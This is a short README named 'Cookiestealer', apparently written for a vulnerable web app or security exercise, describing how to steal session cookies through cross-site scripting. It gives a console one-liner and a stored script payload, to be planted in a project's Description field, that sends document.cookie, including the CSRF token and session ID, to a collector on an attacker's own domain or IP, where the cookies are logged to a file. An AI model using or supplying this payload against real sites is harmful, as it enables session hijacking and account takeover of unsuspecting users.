# Cookiestealer

Since `HttpOnly` is `false`, and XSS is enabled, it's possible to steal the cookies (and get access to `CSRFtoken` and `sessionID`) the following way:

## Test locally

If running locally, you can steal the cookies by running

```
document.location= "http://127.0.0.1:3000/cookiestealer.php?c=" + document.cookie
```

in the console in developer tools.

## Embed in XSS, execute remotely

Put the following in the `Description` field in a new project (perhaps also the `Description` field of the task?), replacing `http://127.0.0.1:3000` with your own domain or IP:

```
<script language="javascript"> document.location= "http://127.0.0.1:3000/cookistealer.php?c=" + document.cookie; </script>
```

The cookies will then be saved to `cookielog.txt`.
